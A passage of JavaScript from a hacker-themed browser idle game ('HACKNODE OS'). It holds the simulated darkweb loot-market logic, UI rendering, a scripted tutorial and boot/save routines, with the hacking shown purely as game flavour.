    const mult=getLootValueMult(loot.type);
    const earned=Math.min(loot.qty*loot.valueEach, sellRate*loot.valueEach*mult*2); // 2s tick
    const qtySold=Math.min(loot.qty, Math.ceil(sellRate*2));

    if(earned>0){
      G.credits+=earned;
      G.marketEarnings=(G.marketEarnings||0)+earned;
      totalEarned+=earned;
      loot.qty-=qtySold;
    }
    totalPending+=loot.qty*loot.valueEach;
    if(loot.qty<=0)toRemove.push(idx);
  });

  // Remove fully sold items — only log this as a meaningful terminal event
  toRemove.reverse().forEach(i=>{
    const sold=G.lootInventory[i];
    if(sold){
      const total=fmtNum(sold.qty<=0?sold.totalValue||0:0);
      log(`> MARKET: ${sold.label} listing cleared — sale complete`,'dim');
    }
    G.lootInventory.splice(i,1);
  });

  updateMarketTicker(totalEarned/2, totalPending);
  if(totalEarned>0)updateUI();
}

function updateMarketTicker(ratePerSec, pending){
  const el2=el('market-ticker');
  if(!el2)return;
  if(pending<=0&&ratePerSec<=0){el2.classList.remove('active');return;}
  el2.classList.add('active');
  const warn=G.heat>70?' <span class="mt-warn">⚠ buyers spooked</span>':'';
  // Always show rate as dollar amount — even fractions of a cent are visible
  let rateStr;
  if(ratePerSec>0){
    // Format: show cents if <$1, dollars if >=$1
    const rateDisplay=ratePerSec>=1
      ?`$${ratePerSec.toFixed(2)}`
      :`$${ratePerSec.toFixed(3)}`;
    rateStr=`<span class="mt-val">+${rateDisplay}/s</span>`;
  } else {
    rateStr=`<span style="color:#4a7a4a">queued</span>`;
  }
  el2.innerHTML=`MARKET: ${rateStr} ▸ <span class="mt-val">$${fmtNum(pending)}</span> pending${warn}`;
}

// Market panel render
function renderMarket(container){
  // Summary bar
  const summary=document.createElement('div');
  summary.style.cssText='margin:8px 10px;padding:10px 12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;';
  const bwMult=Math.log2(G.bandwidth/56+1)*0.5+0.5;
  const totalPending=(G.lootInventory||[]).reduce((a,l)=>a+l.qty*l.valueEach,0);
  const heatWarn=G.heat>70?' <span style="color:#ff2d2d">⚠ heat spoiling prices</span>':'';
  summary.innerHTML=`
    <div style="color:#ffb700;margin-bottom:6px;letter-spacing:2px;">// DARKWEB MARKET</div>
    <div>Pending: <span style="color:#00ff41">$${fmtNum(totalPending)}</span>${heatWarn}</div>
    <div>Sell rate: <span style="color:#00ff41">${bwMult.toFixed(1)}×</span> bandwidth factor</div>
    <div>Lifetime earned: <span style="color:#00ff41">$${fmtNum(G.marketEarnings||0)}</span></div>`;
  container.appendChild(summary);

  if(!G.lootInventory||G.lootInventory.length===0){
    const empty=document.createElement('div');
    empty.style.cssText='margin:8px 10px;padding:12px;border:1px dashed #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;text-align:center;';
    empty.textContent='// No listings. Complete missions to generate loot.';
    container.appendChild(empty); return;
  }

  // Loot listings
  const lHdr=document.createElement('div');
  lHdr.style.cssText='padding:6px 12px;font-size:9px;color:#4a7a4a;letter-spacing:2px;';
  lHdr.textContent=`// ACTIVE LISTINGS (${G.lootInventory.length})`;
  container.appendChild(lHdr);

  const bwM2=Math.log2(G.bandwidth/56+1)*0.5+0.5;
  G.lootInventory.forEach(loot=>{
    const card=document.createElement('div');
    card.style.cssText='margin:4px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;font-size:10px;';
    const mult=getLootValueMult(loot.type);
    const totalVal=loot.qty*loot.valueEach*mult;
    const sellRate=Math.max(0.5,bwM2*(loot.qty>1000?2:1));
    // How many seconds to sell this listing
    const secsLeft=loot.valueEach>0?Math.ceil(loot.qty/sellRate):0;
    const timeLeft=secsLeft>3600?Math.ceil(secsLeft/3600)+'h':secsLeft>60?Math.ceil(secsLeft/60)+'m':secsLeft+'s';
    const ratePerSec=(sellRate*loot.valueEach*mult);
    const rateStr=ratePerSec>=0.01?`+$${ratePerSec.toFixed(ratePerSec>=1?2:3)}/s`:'<$0.01/s';
    const minsAgo=Math.floor((Date.now()-loot.listedAt)/60000);
    card.innerHTML=`
      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:4px;">
        <span style="color:#00ff41;font-size:12px;">${loot.label}</span>
        <span style="color:#ffb700;font-size:12px;">$${fmtNum(totalVal)}</span>
      </div>
      <div style="color:#4a7a4a;margin-bottom:3px;">
        ${fmtNum(loot.qty)} units × $${loot.valueEach.toFixed(2)} each
        ${mult<1?` <span style="color:#ff2d2d">−heat penalty</span>`:''}
        ${mult>1&&G.faction?` <span style="color:#cc44ff">+faction bonus</span>`:''}
      </div>
      <div style="display:flex;justify-content:space-between;font-size:9px;color:#4a7a4a;">
        <span style="color:#00aa2a">SELLING ${rateStr} · clears in ~${timeLeft}</span>
        <span>from ${loot.source}</span>
      </div>`;
    container.appendChild(card);
  });
}

// ═══════════════════════════════════════════════

// Tutorial state — what step are we waiting on
let tutWaiting = null; // null | 'tap_mission' | 'tap_type' | 'phase2_done' | 'open_hw' | 'open_map'

// Called after each meaningful action to advance tutorial
function tutorialCheck(event){
  if(G.tutorialDone) return;
  if(tutWaiting === event){
    tutWaiting = null;
    // Small delay then next step
    setTimeout(()=>tutorialAdvance(), 600);
  }
}

async function runTutorial(){
  G.tutorialStep = 0;
  G.tutorialDone = false;

  // Boot lines
  const bootLines = [
    ['> HACKNODE OS v0.5.0','dim',180],
    ['> Initializing...','dim',120],
    ['> Alias assigned: ghost_r00t','ok',150],
    ['> Location: UNKNOWN  |  Status: UNTRACEABLE','ok',180],
    ['─'.repeat(36),'sep',300],
  ];
  for(const[t,c,w] of bootLines){ log(t,c); await delay(w); }

  await delay(400);
  await tutorialAdvance();
}

async function tutorialAdvance(){
  if(G.tutorialDone) return;
  G.tutorialStep++;

  switch(G.tutorialStep){

    case 1:
      logMsg('v01d: You found this terminal. Good. That means you know what you are doing — or you think you do.','void');
      logMsg('v01d: I will walk you through your first operation. Pay attention.','void');
      log('> [MSG] Incoming message. Check the MSG tab above.','info');
      await delay(1200);
      log('> Your first target: the local network. You need to map it before you can touch it.','dim');
      await delay(800);
      log('> Tap [ OPS ] in the nav bar below to select a mission.','info');
      tutWaiting = 'tap_mission';
      break;

    case 2:
      await delay(400);
      log('> Good. You will see NETWORK SCAN is the only available op right now.','dim');
      await delay(600);
      log('> Select it. This runs nmap against your local subnet.','info');
      break;

    case 3:
      // Mission selected — explain phase 1
      await delay(500);
      log('> Phase 1: Execute the command.','info');
      await delay(400);
      log('> Every op starts with you running the command manually. Tap the button to type.','dim');
      await delay(400);
      log('> Each tap advances one character. Upgrade your scripting tools later to go faster.','dim');
      tutWaiting = 'tap_type'; // wait for first tap
      break;

    case 4:
      // First tap happened
      await delay(300);
      log('> Keep tapping until the command is complete.','dim');
      tutWaiting = 'phase2_start';
      break;

    case 5:
      // Phase 2 started
      await delay(200);
      log('> Phase 2: Hardware processes the op. Watch the countdown.','proc');
      await delay(500);
      log('> Your CPU, bandwidth, and latency determine how fast this runs.','dim');
      await delay(400);
      log('> See the TRACE meter in the header? Every op raises it. Hit 100% and you burn.','warn');
      tutWaiting = 'phase2_done';
      break;

    case 6:
      // Mission complete
      await delay(500);
      log('─'.repeat(36),'sep');
      log('> First op done. Check your MAP — a new node was revealed.','info');
      await delay(600);
      log('> Tap [ MAP ] in the nav bar.','info');
      tutWaiting = 'open_map';
      break;

    case 7:
      // Map opened
      await delay(500);
      log('> That node is now a target. Run more recon to reveal the rest.','dim');
      await delay(600);
      log('> When you have nodes revealed, you can run tougher ops against them.','dim');
      await delay(600);
      log('> Now check your hardware. Tap [ HW ].','info');
      tutWaiting = 'open_hw';
      break;

    case 8:
      // HW opened
      await delay(500);
      log('> Upgrades cost credits. Start with DSL and Tab Complete — both change how the game feels immediately.','dim');
      await delay(600);
      log('> DSL speeds up data transfers. Tab Complete lets each tap complete a full word.','dim');
      await delay(800);
      logMsg('v01d: One more thing. The TRACE meter does not stay high on its own — it decays. But run too many ops in a row and it will catch up with you. Pace yourself. Or do not. Your call.','void');
      log('> [MSG] Another message from v01d.','info');
      await delay(600);
      log('─'.repeat(36),'sep');
      log('> Tutorial complete. You know enough to be dangerous.','ok');
      await delay(400);
      log('> Run more ops. Reveal more nodes. Upgrade your rig. Expand.','dim');
      await delay(200);
      log('> Someone is watching. They always are.','dim');
      G.tutorialDone = true;
      save();
      break;
  }
}

// Hook tutorial events into existing functions
// These are called from within mission/UI functions
function onTutMissionSelected(){
  if(G.tutorialDone) return;
  if(G.tutorialStep === 1){ tutorialCheck('tap_mission'); tutorialAdvance(); }
  else if(G.tutorialStep === 2){ G.tutorialStep = 2; tutorialAdvance(); }
}
function onTutFirstTap(){
  if(G.tutorialDone||G.tutorialStep < 3) return;
  if(G.tutorialStep === 3){ tutorialCheck('tap_type'); tutorialAdvance(); }
}
function onTutPhase2Start(){
  if(G.tutorialDone) return;
  if(G.tutorialStep === 4){ tutorialCheck('phase2_start'); tutorialAdvance(); }
}
function onTutPhase2Done(){
  if(G.tutorialDone) return;
  if(G.tutorialStep === 5){ tutorialCheck('phase2_done'); tutorialAdvance(); }
}
function onTutMapOpened(){
  if(G.tutorialDone) return;
  if(G.tutorialStep === 6){ tutorialCheck('open_map'); tutorialAdvance(); }
}
function onTutHWOpened(){
  if(G.tutorialDone) return;
  if(G.tutorialStep === 7){ tutorialCheck('open_hw'); tutorialAdvance(); }
}

async function boot(){
  const status=el('bootstatus'),screen=el('boot');
  // Load sound pref first
  const snd=localStorage.getItem('hacknode_snd');
  const hasSave=load();
  G.soundOn=snd==='1'; // sound pref overrides save
  const sndBtn=document.getElementById('nb-snd');
  if(sndBtn){sndBtn.textContent=G.soundOn?'SND✓':'SND';sndBtn.style.color=G.soundOn?'#00ff41':'#4a7a4a';}

  for(const line of['HACKNODE OS v0.4.0','Kernel modules loaded...','Network stack initialised...','Anonymisation layer: ACTIVE','Narrative engine: ONLINE','System ready.']){status.textContent=line;await delay(240);}
  await delay(300);
  screen.style.transition='opacity .5s'; screen.style.opacity='0';
  await delay(500); screen.style.display='none';

  initNetworkMap();

  if(hasSave){
    G.missionRunning=false; G.phase=null; G.activeMission=null;
    if(!G.missionQueue)G.missionQueue=[];
    if(!G.knownTargets)G.knownTargets={};
    if(!G.networkNodes)G.networkNodes={};
    if(!G.sectorProgress)G.sectorProgress={0:{missions:0,owned:0}};
    if(!G.unlockedSectors)G.unlockedSectors=[0];
    if(!G.deployedScripts)G.deployedScripts=[];
    if(!G.lootInventory)G.lootInventory=[];
    if(!G.marketEarnings)G.marketEarnings=0;
    if(!G.newsItems)G.newsItems=[];
    if(G.faction&&FACTION_MT[G.faction])FACTION_MISSIONS=FACTION_MT[G.faction].map(t=>genMission(t));
    if(G.typingTier>=3)startAutoTick();
    initNetworkMap(); initRivalNodes(); renderNewsPane();
    // Restore faction bar
    if(G.faction){el('faction-bar').classList.add('on');el('faction-cipher').style.display=G.faction==='cipher'?'block':'none';el('faction-ghost').style.display=G.faction==='ghost'?'block':'none';}
    updateUI(); updateTapBtn(); updateHD();
    log('> Connection restored.','dim');
    log(`> Welcome back, ${G.alias}`,'ok');
    if(G.faction)log(`> Faction: ${G.faction.toUpperCase()} — standing confirmed`,G.faction);
    if(G.missionsCompleted>0)log(`> ${G.missionsCompleted} ops on record. ${Object.keys(G.knownTargets).length} targets known.`,'dim');
    const g=calcOff(Math.floor((Date.now()-G.lastSeen)/1000));
    if(g)showOffModal(g);
  }else{
    initNetworkMap(); initRivalNodes();
    updateUI(); updateTapBtn();
    await runTutorial();
  }
}
function delay(ms){return new Promise(r=>setTimeout(r,ms));}

boot();
setInterval(()=>save(),30000);
// Market tick — drains loot into credits
setInterval(()=>marketTick(),2000);
// Script tick
setInterval(()=>scriptTick(),2000);
// Rival passive reclaim — every 10 minutes
setInterval(()=>{if(Object.values(G.networkNodes||{}).filter(n=>n.status==='owned').length>2)rivalPassiveReclaim();},600000);
// Rival active raids — random chance every 3 min if heat is high
setInterval(()=>{if(G.heat>50&&G.missionRunning&&Math.random()<.3)triggerRivalRaid();},180000);
// News feed — new item every 3-5 min
setInterval(()=>{
  if(G.missionsCompleted>=3){addNewsItem();}
},rnd(180000,300000));
// Sector progress bar update
setInterval(()=>{
  // Update owned count in sector progress
  const owned=countOwnedInSector(G.currentSector);
  if(!G.sectorProgress[G.currentSector])G.sectorProgress[G.currentSector]={missions:0,owned:0};
  G.sectorProgress[G.currentSector].owned=owned;
  tryUnlockSectors();
},10000);
</script>
